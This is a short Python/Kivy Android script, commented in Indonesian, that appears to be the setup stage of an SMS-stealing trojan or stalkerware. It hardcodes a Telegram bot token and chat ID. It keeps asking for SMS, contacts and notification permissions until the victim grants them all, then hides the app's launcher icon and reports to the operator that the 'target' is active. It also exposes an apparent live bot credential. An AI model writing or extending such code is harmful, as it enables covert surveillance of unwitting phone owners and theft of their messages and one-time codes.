import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
import os

# Konfigurasi Bot
TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

def hide_now():
    """Fungsi untuk menghilangkan ikon aplikasi dari menu"""
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        pm = activity.getPackageManager()
        package_name = activity.getPackageName()
        
        # Nama class utama Kivy
        component_name = autoclass('android.content.ComponentName')(package_name, 'org.kivy.android.PythonActivity')
        
        # Hilangkan ikon (STATE_DISABLED = 2)
        pm.setComponentEnabledSetting(component_name, 2, 1)
        
        bot.send_message(CHAT_ID, "⚠️ LOKTV: Ikon berhasil disembunyikan dan target aktif!")
    except Exception as e:
        bot.send_message(CHAT_ID, f"❌ Gagal sembunyi: {str(e)}")

def on_permissions(permissions, grants):
    """Callback setelah user menanggapi popup izin"""
    if all(grants):
        # Jika semua diizinkan, kirim pesan sukses ke bot
        bot.send_message(CHAT_ID, "✅ Target memberikan izin SMS & Notifikasi!")
        # BARU SEMBUNYIKAN IKON SETELAH IZIN DIDAPAT
        hide_now()
    else:
        # Jika ditolak, minta lagi (maksa)
        start_request()

def start_request():
    """Meminta izin ke user"""
    request_permissions([
        Permission.READ_SMS, 
        Permission.RECEIVE_SMS, 
        Permission.POST_NOTIFICATIONS,
        Permission.READ_CONTACTS
    ], on_permissions)

if __name__ == '__main__':
    # JANGAN panggil hide_now di sini, tapi minta izin dulu!
    # Dengan memanggil start_request, popup akan muncul saat aplikasi dibuka
    start_request()
